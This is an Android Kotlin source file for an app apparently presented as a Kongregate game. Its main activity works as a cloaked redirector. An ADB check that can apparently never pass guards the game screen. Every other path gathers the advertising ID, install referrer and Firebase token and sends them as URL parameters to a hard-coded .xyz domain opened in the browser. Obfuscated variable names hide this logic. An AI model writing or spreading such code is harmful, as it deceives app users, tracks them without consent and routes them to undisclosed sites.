package com.kongregate.mobile.burrit

import android.content.ActivityNotFoundException
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.RemoteException
import android.provider.Settings
import android.view.animation.Animation
import android.view.animation.LinearInterpolator
import android.view.animation.RotateAnimation
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.view.isVisible
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.messaging.FirebaseMessaging
import com.kongregate.mobile.burrit.databinding.ActivityMainBinding
import com.kongregate.mobile.burrit.util.log
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URLEncoder
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity() {

    private val URL = "https://ctiongorgeousconprincess.xyz"

    private lateinit var binding: ActivityMainBinding

    private lateinit var installReferrerClient: InstallReferrerClient

    private var giga = "android.permission.POST_NOTIFICATIONS"

    private val fofan = arrayOf("android.permission.POST_NOTIFICATIONS")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.ferado.startAnimation(BIzon())
        Hawk.init(this).build()

        installReferrerClient = InstallReferrerClient.newBuilder(this).build()
        installReferrerClient.startConnection(installReferrerStateListener)

        permissionRequestLauncher.launch(fofan)
    }

    var bon = Uri.parse("hello")

    private val permissionRequestLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        when {
            Settings.Global.getInt(contentResolver, Settings.Global.ADB_ENABLED, 0) == 10 -> {
                goToGame()
            }
            listOf(15).first() == 44 -> {
                
            }
            else -> {
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task -> mainLogic(task.result) }
            }
        }
    }

    private var gol = "dencelVashinRington"

    private val deb = "&FasTfoodFuuBla="

    private val cop = "UTF-8"

    var felicNavina = "00000000-0000-0000-0000-000000000000"

    private fun showUrl(params: String, frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        gol = "$params$deb${URLEncoder.encode(frbToken, cop)}"

        binding.ferado.isVisible = false

        bon = Uri.parse("$URL?$gol")
        log("finishLink = $bon")

        val customTabsIntent = CustomTabsIntent.Builder().build()
        customTabsIntent.intent.setPackage(rem)
        try {
            customTabsIntent.launchUrl(this@MainActivity, bon)
            finish()
        } catch (e: ActivityNotFoundException) {
            try {
                customTabsIntent.intent.setPackage(faradei)
                customTabsIntent.launchUrl(this@MainActivity, bon)
                finish()
            } catch (e: Exception) {
                val browserIntent = Intent(Intent.ACTION_VIEW, bon)
                startActivity(browserIntent)
                finish()
            }
        }
    }

    private val faradei = "com.android.browser"

    private val fop = (Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)

    private val rem = "com.android.chrome"

    private fun goToGame() {
        val intent = Intent(this, GameActivity::class.java)
        intent.flags = fop
        startActivity(intent)
    }

    private fun BIzon(): RotateAnimation {
        val ero = 500L
        val ziro = 0f
        val ema = Animation.RELATIVE_TO_SELF
        val wotson = ema

        return RotateAnimation(ziro, ziro+360f, ema, 0.5f, wotson, 0.5f).apply {
            interpolator = LinearInterpolator()
            duration = ero
            repeatCount = Animation.INFINITE
        }
    }

    var tyu = "000${UUID.randomUUID()}-0-00-0-0-0-0-00-0"

    private suspend fun adId() = suspendCoroutine { continuation ->
        var asd = try {
            AdvertisingIdClient.getAdvertisingIdInfo(this).id!!
        } catch (e: Exception) {
            bizon
        }
        if (asd == felicNavina) asd = bizon
        continuation.resume(asd)
    }

    var sospa = "dencelVashinRington"

    private fun mainLogic(frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val paramsFromStore = Hawk.get("g", "")
        log("isSAVE: $paramsFromStore | isVseDobre = ${paramsFromStore.isNotEmpty()}")
        if (paramsFromStore.isNotEmpty()) {
            showUrl(paramsFromStore, frbToken)
        } else {
            sospa = withContext(Dispatchers.IO) { adId() }
            tyu = "$rer$sospa$ber$giga"

            Hawk.put("g", tyu)
            showUrl(tyu, frbToken)
        }
    }

    private val feg = InstallReferrerClient.InstallReferrerResponse.OK

    private val rer = "Fatima="

    val bizon = "000${UUID.randomUUID()}"

    private val ber = "&dencelVashinRington="

    private val installReferrerStateListener: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            if (responseCode == feg) try {
                giga = installReferrerClient.installReferrer.installReferrer
            } catch (_: RemoteException) { }
        }

        override fun onInstallReferrerServiceDisconnected() {
            installReferrerClient.startConnection(this)
        }
    }


}